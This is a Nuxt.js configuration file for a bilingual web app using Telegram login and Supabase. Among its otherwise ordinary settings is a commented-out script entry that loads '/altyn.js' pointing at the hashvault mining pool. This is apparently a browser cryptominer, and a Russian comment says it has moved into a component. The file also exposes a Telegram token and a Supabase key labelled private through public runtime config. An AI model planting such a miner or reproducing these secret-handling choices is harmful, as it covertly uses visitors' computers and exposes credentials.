// https://nuxt.com/docs/api/configuration/nuxt-config
export default defineNuxtConfig({

  app: {
    head: {
      meta: [
        { name: "yandex-verification", content: "7aa88133122bb8a4" },
        { name: "monetag", content: "e2d78787a1deac938fa851c3d0fc0549" },
        { name: "182e57a821c89320a8d7e5324b0869eb7ec8b532", content: "182e57a821c89320a8d7e5324b0869eb7ec8b532"},

    

      ],


        link: [
          {
            rel: 'stylesheet',
            href: 'https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap',
          },
        ],

      /*
      script: [
        { src: "/altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443", defer: true }
      ]
        */

      //Это подключал глобально, но теперь в компоненте.
    }
  },

  runtimeConfig: {
    TELEGRAM_TOKEN: process.env.NUXT_PUBLIC_TELEGRAM_TOKEN, // Публичный ключ для Telegram
    public: {
    supabaseUrl: process.env.NUXT_PUBLIC_SUPABASE_URL, // Публичный URL для Supabase
      // Приватный ключ для Supabase
    supabaseKey: process.env.NUXT_PUBLIC_SUPABASE_KEY,
    },
    
  }
,

  devServer: {
    hmr: {
      clientPort: 443, // Указываем порт 443 (HTTPS)
    }
  }
,
  compatibilityDate: '2024-11-01',
  devtools: { enabled: true },
  modules: [
    'nuxt-telegram-auth', 
    '@nuxthub/core',
    '@nuxtjs/i18n'
  
  ],
    
  i18n: {
    locales: [ // Список поддерживаемых языков
      { code: 'en', name: 'English', file: 'en.json' },
      { code: 'ru', name: 'Русский', file: 'ru.json' }
    ],
    defaultLocale: 'en', // Язык по умолчанию
    lazy: true, // Ленивая загрузка переводов
    langDir: '../locales', // Папка с файлами переводов
    strategy: 'prefix_except_default', // Стратегия маршрутизации
    //strategy: 'no_prefix',

    bundle: {
      optimizeTranslationDirective: false, // Убираем предупреждение
    },
    
    detectBrowserLanguage: { // Автоматическое определение языка браузера
      useCookie: true,
      cookieKey: 'i18n_redirected',
      redirectOn: 'root'
    }
  },

  vite: {
    server: {
      
      allowedHosts: ['.ngrok-free.app', '.localhost.run', '.lhr.life']

    }
  }



})